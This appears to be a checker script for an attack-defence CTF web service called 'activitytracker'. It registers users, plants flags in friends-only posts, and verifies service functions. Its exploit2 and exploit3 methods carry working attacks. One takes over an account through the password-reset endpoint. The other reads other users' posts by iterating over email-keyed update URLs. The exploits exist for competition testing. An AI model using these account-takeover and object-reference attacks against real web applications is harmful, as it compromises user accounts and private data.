#!/usr/bin/env python3
import hashlib
import html

import requests
from enochecker import BaseChecker, BrokenServiceException, EnoException, run
from enochecker.storeddict import DB_DEFAULT_DIR, DB_GLOBAL_CACHE_SETTING
from enochecker.utils import assert_in
import random
import string
import barnum
import os
from PIL import Image
import secrets
import re

from enochecker_core import CheckerTaskMessage


class ActivitytrackerChecker(BaseChecker):
    """
    Change the methods given here, then simply create the class and .run() it.
    Magic.
    A few convenient methods and helpers are provided in the BaseChecker.
    ensure_bytes ans ensure_unicode to make sure strings are always equal.
    As well as methods:
    self.connect() connects to the remote server.
    self.get and self.post request from http.
    self.chain_db is a dict that stores its contents to a mongodb or filesystem.
    conn.readline_expect(): fails if it's not read correctly
    To read the whole docu and find more goodies, run python -m pydoc enochecker
    (Or read the source, Luke)
    """

    # EDIT YOUR CHECKER PARAMETERS
    flag_variants = 2
    noise_variants = 2
    havoc_variants = 3
    exploit_variants = 2
    service_name = "activitytracker"
    port = 4242  # The port will automatically be picked up as default by self.connect and self.http.

    POSTS_PAGE = '/posts/view/0'

    # END CHECKER PARAMETERS

    def __init__(self, task: CheckerTaskMessage,
                 storage_dir: str = DB_DEFAULT_DIR,
                 use_db_cache: bool = DB_GLOBAL_CACHE_SETTING,
                 json_logging: bool = True, ):
        super().__init__(
            task,
            storage_dir,
            use_db_cache,
            json_logging)
        self.http_session.verify = True

    @staticmethod
    def generate_random_image(filename):
        im = Image.open('images/profile.png')
        # im = Image.new('RGB', (30, 30))
        pixels = im.load()
        for x in range(min(30, im.size[0])):
            for y in range(min(30, im.size[1])):
                pixels[x, y] = (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
        im.save(filename, format='png')
        return filename

    @staticmethod
    def check_response(resp, status, location, action="performing request"):
        if resp.status_code != status:
            raise BrokenServiceException(f"Unexpected status code after {action}: {resp.status_code}")
        if location:
            if resp.headers['Location'] != location:
                raise BrokenServiceException(f"Unexpected redirect after {action}: {resp.headers['Location']}")

    def register_user(self, email: str, password: str, image_path: str = "", use_image: bool = False):
        if use_image:
            filename = "/tmp/" + secrets.token_urlsafe(10) + ".png"
            if image_path:
                filename = image_path
            else:
                self.generate_random_image(filename)
            with open(filename, 'rb') as verification_image:
                resp = self.http_post("/auth/signup",
                                      data={
                                          "email": email,
                                          "password": password
                                      },
                                      files={
                                          "image": verification_image
                                      },
                                      allow_redirects=False
                                      )
        else:
            resp = self.http_post("/auth/signup",
                                  data={
                                      "email": email,
                                      "password": password
                                  },
                                  allow_redirects=False
                                  )
        self.check_response(resp, 303, self.POSTS_PAGE, "registering user")

    def login_user(self, email: str, password: str):
        resp = self.http_post("/auth/login",
                              data={
                                  "email": email,
                                  "password": password
                              })
        self.check_response(resp, 303, self.POSTS_PAGE, "logging in user")

    def create_post(self, contents, visibility='public', protected=False):
        resp = self.http_post('/posts/insert', files={
            "body": contents,
            "visibility": visibility,
            "protected": "true" if protected else "false"
        },
                              allow_redirects=False)
        self.check_response(resp, 303, self.POSTS_PAGE, "creating posts")

    def add_friend(self, email):
        resp = self.http_post('/friends/insert', files={
            "email": email
        })
        self.check_response(resp, 303, self.POSTS_PAGE, "adding friend")

    @staticmethod
    def generate_matching_emails(person1, person2, company):
        tld = barnum.create_email().split(".")[-1]
        domain = f"{company.lower().replace(' ', '')}.{tld}"
        email_patterns = [
            lambda x: f"{x[0][0]}.{x[1]}",
            lambda x: f"{x[0]}.{x[1]}",
            lambda x: f"{x[0]}{x[1]}",
            lambda x: f"{x[0][0]}{x[1]}",
            lambda x: f"{x[1]}",
            lambda x: f"{x[0]}",
            lambda x: f"{x[0]}{x[1][0]}",
        ]
        pattern = random.choice(email_patterns)
        return (
            f"{pattern(person1)}@{domain}",
            f"{pattern(person2)}@{domain}",
        )

    def putflag(self):  # type: () -> None
        """
        This method stores a flag in the service.
        In case multiple flags are provided, self.variant_id gives the appropriate index.
        The flag itself can be retrieved from self.flag.
        On error, raise an Eno Exception.
        :raises EnoException on error
        :return this function can return a result if it wants
                if nothing is returned, the service status is considered okay.
                the preferred way to report errors in the service is by raising an appropriate enoexception
        """

        if self.variant_id == 0:
            # First we need to register a user
            firstname, lastname = barnum.create_name()
            lastname += str(random.randint(1, 1000))
            company = barnum.create_company_name()
            jobtitle = barnum.create_job_title()
            password = barnum.create_pw(length=10)
            email = barnum.create_email(name=(firstname, lastname)).lower()

            self.register_user(email, password)

            # self.generate_random_posts(random.randint(0, 3),
            #                            data={"firstname": firstname, "lastname": lastname, "company": company,
            #                                  "jobtitle": jobtitle, "password": password}, templates='simple')

            self.create_post(f"A friend of mine keeps posting their passwords! LOL!",
                             "public",
                             True)

            # self.generate_random_posts(random.randint(0, 3),
            #                            data={"firstname": firstname, "lastname": lastname, "company": company,
            #                                  "jobtitle": jobtitle, "password": password}, templates='simple')

            # self.http_get('/auth/logout')

            original_email = email
            firstname, lastname = secrets.token_urlsafe(10), secrets.token_urlsafe(10)
            checker_email = barnum.create_email(name=(firstname, lastname)).lower()
            checker_password = barnum.create_pw(length=10)

            self.register_user(checker_email, checker_password)
            # self.http_get('/auth/logout')

            firstname, lastname = barnum.create_name()
            lastname += str(random.randint(1, 1000))
            company = barnum.create_company_name()
            jobtitle = barnum.create_job_title()
            password = barnum.create_pw(length=10)
            email = barnum.create_email(name=(firstname, lastname)).lower()

            self.register_user(email, password)

            self.create_post(self.flag,
                             "friends",
                             True)

            self.add_friend(original_email)
            self.add_friend(checker_email)

            # self.http_get('/auth/logout')

            # Save the generated values for the associated getflag() call.
            self.chain_db = {
                "username": checker_email,
                "password": checker_password,
            }
        elif self.variant_id == 1:
            firstname, lastname = secrets.token_urlsafe(10), secrets.token_urlsafe(10)
            checker_email = barnum.create_email(name=(firstname, lastname)).lower()
            checker_password = barnum.create_pw(length=10)
            self.register_user(checker_email, checker_password)

            # First we need to register a user
            firstname, lastname = barnum.create_name()
            company = barnum.create_company_name()
            jobtitle = barnum.create_job_title()
            password = barnum.create_pw(length=10)

            boss_firstname, boss_lastname = barnum.create_name()
            boss_password = barnum.create_pw(length=10)

            email, boss_email = self.generate_matching_emails((firstname.lower(), lastname.lower()),
                                                              (boss_firstname.lower(), boss_lastname.lower()),
                                                              company)

            self.register_user(email, password)

            # self.generate_random_posts(random.randint(0, 3),
            #                            data={"firstname": firstname, "lastname": lastname, "company": company,
            #                                  "jobtitle": jobtitle, "password": password,
            #                                  "boss_firstname": boss_firstname, "boss_lastname": boss_lastname})

            self.create_post(f"Private posts are useful to save passwords ^^ Nice ^^",
                             "public",
                             True)

            self.create_post(self.flag,
                             "friends",
                             True)

            self.add_friend(checker_email)

            # self.generate_random_posts(random.randint(0, 3),
            #                            data={"firstname": firstname, "lastname": lastname, "company": company,
            #                                  "jobtitle": jobtitle, "password": password,
            #                                  "boss_firstname": boss_firstname, "boss_lastname": boss_lastname})

            # self.http_get('/auth/logout')


            # Save the generated values for the associated getflag() call.
            self.chain_db = {
                "username": checker_email,
                "password": checker_password,
            }
        else:
            raise EnoException("Wrong variant_id provided")

    def check_page(self, page):
        resp = self.http_get(f"/posts/view/{page}")
        self.check_response(resp, 200, "", "getting posts")
        return html.unescape(resp.text)

    def check_pages(self, flag):
        page = 0
        while 1:
            t = self.check_page(page)
            if "Activities by" not in t:
                return ""
            if flag in t:
                return t
            page += 1

    def check_mine(self):
        resp = self.http_get(f"/posts/my")
        t = html.unescape(resp.text)
        return t

    def check_friends(self):
        resp = self.http_get(f"/posts/friends")
        t = html.unescape(resp.text)
        return t

    def getflag(self):  # type: () -> None
        """
        This method retrieves a flag from the service.
        Use self.flag to get the flag that needs to be recovered and self.round to get the round the flag was placed in.
        On error, raise an EnoException.
        :raises EnoException on error
        :return this function can return a result if it wants
                if nothing is returned, the service status is considered okay.
                the preferred way to report errors in the service is by raising an appropriate enoexception
        """
        if self.variant_id == 0 or self.variant_id == 1:
            # First we check if the previous putflag succeeded!
            try:
                username: str = self.chain_db["username"]
                password: str = self.chain_db["password"]
            except (IndexError, KeyError) as ex:
                self.debug(f"error getting notes from db: {ex}")
                raise BrokenServiceException("Previous putflag failed.")

            self.login_user(username, password)

            # Let´s obtain our note.
            resp = self.check_friends()

            assert_in(
                self.flag, resp, "Resulting flag was found to be incorrect"
            )
        else:
            raise EnoException("Wrong variant_id provided")


    def generate_workout(self):
        ex = [
            "Pushup",
            "Pullup",
            "Chinup",
            "Burpee",
            "Plank",
            "Squats",
            "Run",
            "Jump",
            "Lunges",
            "Crunches",
            "Rows"
        ]
        w = []
        for i in range(random.randint(5, 15)):
            w.append(random.choice(ex) + " x " + str(random.randint(5, 50)))
        return "Today's workout: " + ", ".join(w)


    def generate_random_posts(self, n=1, templates="any", data=None, private=2):
        """
        Creates n posts using the defined templates. private=0: public, 1: private, 2: random

        User should already be logged in.
        """
        posts = []
        directory = r"/checker/post_templates/"
        if not os.path.exists(directory):
            directory = r"post_templates"
        for filename in os.listdir(directory):
            if filename.endswith(".template"):
                f = os.path.join(directory, filename)
                if templates == "any" or templates in f:
                    with open(f) as template:
                        posts.extend(list(map(lambda x: x.strip(), template.readlines())))
            else:
                continue

        if not posts:
            raise EnoException("No matching template found.")

        for i in range(n):
            p = random.random() > 0.5
            if private == 1:
                p = False
            elif private == 0:
                p = True
            while 1:
                try:
                    if random.random() < 0.3:
                        body = random.choice(posts).format(**data) if data else random.choice(posts)
                    else:
                        body = self.generate_workout()
                    self.create_post(body,
                                     "public" if p else "private",
                                     random.random() < 0.1)
                    break
                except:
                    pass

    def putnoise(self):  # type: () -> None
        """
        This method stores noise in the service. The noise should later be recoverable.
        The difference between noise and flag is, that noise does not have to remain secret for other teams.
        This method can be called many times per round. Check how often using self.variant_id.
        On error, raise an EnoException.
        :raises EnoException on error
        :return this function can return a result if it wants
                if nothing is returned, the service status is considered okay.
                the preferred way to report errors in the service is by raising an appropriate enoexception
        """
        if self.variant_id == 0 or self.variant_id == 1:
            # A public or private post
            firstname, lastname = barnum.create_name()
            password = barnum.create_pw(length=10)
            email = barnum.create_email(name=(firstname, lastname)).lower()
            company = barnum.create_company_name()
            jobtitle = barnum.create_job_title()
            text = secrets.token_urlsafe(128)

            self.register_user(email, password)

            self.generate_random_posts(n=random.randint(5, 10),
                                       data={"firstname": firstname, "lastname": lastname, "company": company,
                                             "jobtitle": jobtitle, "password": password}, templates="simple")
            self.create_post(text,
                             "public" if self.variant_id == 0 else "private",
                             True)

            self.generate_random_posts(n=random.randint(5, 10),
                                       data={"firstname": firstname, "lastname": lastname, "company": company,
                                             "jobtitle": jobtitle, "password": password}, templates="simple")

            # self.http_get('/auth/logout')
            self.chain_db = {
                "username": email,
                "password": password,
                "text": text
            }

        else:
            raise EnoException("Wrong variant_id provided")

    def getnoise(self):  # type: () -> None
        """
        This method retrieves noise in the service.
        The noise to be retrieved is inside self.flag
        The difference between noise and flag is, that noise does not have to remain secret for other teams.
        This method can be called many times per round. Check how often using variant_id.
        On error, raise an EnoException.
        :raises EnoException on error
        :return this function can return a result if it wants
                if nothing is returned, the service status is considered okay.
                the preferred way to report errors in the service is by raising an appropriate enoexception
        """
        if self.variant_id == 0:
            # public post
            try:
                username: str = self.chain_db["username"]
                text: str = self.chain_db["text"]
            except (IndexError, KeyError) as ex:
                self.debug(f"error getting notes from db: {ex}")
                raise BrokenServiceException("Previous putflag failed.")

            # Let´s obtain our note.
            resp = self.check_pages(text)

            assert_in(
                text, resp, "Public posts are not working"
            )
            assert_in(
                username, resp, "Public posts are not working"
            )
        elif self.variant_id == 1:
            # private post
            try:
                username: str = self.chain_db["username"]
                password: str = self.chain_db["password"]
                text: str = self.chain_db["text"]
            except (IndexError, KeyError) as ex:
                self.debug(f"error getting notes from db: {ex}")
                raise BrokenServiceException("Previous putflag failed.")

            self.login_user(username, password)

            # Let´s obtain our note.
            resp = self.check_mine()

            # self.http_get('/auth/logout')
            assert_in(
                text, resp, "Private posts are not working"
            )
            assert_in(
                username, resp, "Private posts are not working"
            )
        else:
            raise EnoException("Wrong variant_id provided")

    def havoc(self):  # type: () -> None
        """
        This method unleashes havoc on the app -> Do whatever you must to prove the service still works. Or not.
        On error, raise an EnoException.
        :raises EnoException on Error
        :return This function can return a result if it wants
                If nothing is returned, the service status is considered okay.
                The preferred way to report Errors in the service is by raising an appropriate EnoException
        """
        if self.variant_id == 0:
            # Check edit functionality
            firstname, lastname = barnum.create_name()
            password = barnum.create_pw(length=10)
            email = barnum.create_email(name=(firstname, lastname)).lower()
            text = secrets.token_urlsafe(128)

            self.register_user(email, password)

            self.create_post(text,
                             "public" if self.variant_id == 0 else "private",
                             False)
            resp = self.check_mine()
            t = resp.split("\">Edit</a>")[0]
            url = t.split("href=\"")[-1]

            resp = self.http_get(url)
            assert_in(text, html.unescape(resp.text), "Post editing does not work")
        elif self.variant_id == 1:
            # check delete functionality
            firstname, lastname = barnum.create_name()
            password = barnum.create_pw(length=10)
            email = barnum.create_email(name=(firstname, lastname)).lower()

            self.register_user(email, password)

            random_validation_text = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(64))

            self.create_post(random_validation_text,
                             "public",
                             False)
            resp = html.unescape(self.http_get('/posts/my').text)
            assert_in(random_validation_text, resp)
            t = resp.split("\">Delete</a>")[0]
            url = t.split("href=\"")[-1]
            self.http_get(url)
            resp = self.check_mine()
            if random_validation_text in resp:
                raise BrokenServiceException(
                    "Post deletion does not work.",
                    internal_message=f"{random_validation_text} is in {resp}",
                )
        elif self.variant_id == 2:
            try:
                self.http_get('/posts/delete_old')
            except Exception as e:
                pass
        # TODO: check file upload
        else:
            raise EnoException("Wrong variant_id provided")

    def exploit(self):
        """
        This method was added for CI purposes for exploits to be tested.
        Will (hopefully) not be called during actual CTF.
        :raises EnoException on Error
        :return This function can return a result if it wants
                If nothing is returned, the service status is considered okay.
                The preferred way to report Errors in the service is by raising an appropriate EnoException
        """
        if self.variant_id == 0:
            flag = self.exploit2()
            if flag:
                return flag
            raise BrokenServiceException("Exploit does not work")
        elif self.variant_id == 1:
            flag = self.exploit3()
            if flag:
                return flag
            raise BrokenServiceException("Exploit does not work")
        else:
            raise EnoException("Wrong variant_id provided")

    pattern2 = re.compile("by (.*@.*)")
    pattern3 = re.compile("A friend of mine keeps posting their passwords! LOL!")
    pattern4 = re.compile("Private posts are useful to save passwords")

    def exploit2(self):
        # Create new account
        password_my = secrets.token_urlsafe(16)
        page = 0
        while page < 5:
            resp = self.http_get(f"/posts/view/{page}")
            t = html.unescape(resp.text)
            if "Activities by" not in t:
                break
            page += 1
            # Split post list by user
            user_posts = t.split("Activities")
            for section in user_posts:
                # find user's email and all posts matching pattern
                try:
                    email = re.search(self.pattern2, section).group(1).strip()
                    post = re.search(self.pattern3, section)
                    if not post:
                        continue
                    image_name = f"/tmp/tmp.png"
                    self.generate_random_image(image_name)
                    print(email)
                    self.register_user(f"{email}.{secrets.token_urlsafe(2)}.{secrets.token_urlsafe(2)}.{secrets.token_urlsafe(2)}", password_my, image_name, True)
                    self.http_get('/auth/logout')
                    with open(image_name, 'rb') as image:
                        self.http_post('/auth/forgot', data={
                            "email": email,
                            "password": "hacked1234567890"
                        }, files={
                            "image": image
                        })
                    # get flag
                    resp = self.http_get(f"/posts/friends")
                    print(resp)
                    t = html.unescape(resp.text)
                    f = self.search_flag(t)
                    if f:
                        return f
                except Exception as e:
                    pass

    def exploit3(self):
        # Create new account
        email = f"{secrets.token_urlsafe(16)}@gmail.com"
        password = secrets.token_urlsafe(16)
        self.register_user(email, password)
        page = 0
        while page < 5:
            resp = self.http_get(f"/posts/view/{page}")
            t = html.unescape(resp.text)
            if "Activities by" not in t:
                break
            page += 1
            # Split post list by user
            user_posts = t.split("Activities")
            for section in user_posts:
                # find user's email and all posts matching pattern
                try:
                    email = re.search(self.pattern2, section).group(1).strip()
                    post = re.search(self.pattern4, section)
                    if not post or not email:
                        continue
                    # generate email to attack
                    n = 0
                    self.debug(f"attacking {email}")
                    while True:
                        n += 1
                        # get flag by editing post based on known email
                        resp = self.http_get(f"/posts/update/{email}/{n}")
                        if resp.status_code != 200:
                            break

                        t = html.unescape(resp.text)
                        if "form" not in t:
                            break
                        f = self.search_flag(t)
                        if f:
                            return f
                        if n > 20:
                            break
                except:
                    pass

app = ActivitytrackerChecker.service  # This can be used for uswgi.
if __name__ == "__main__":
    run(ActivitytrackerChecker)
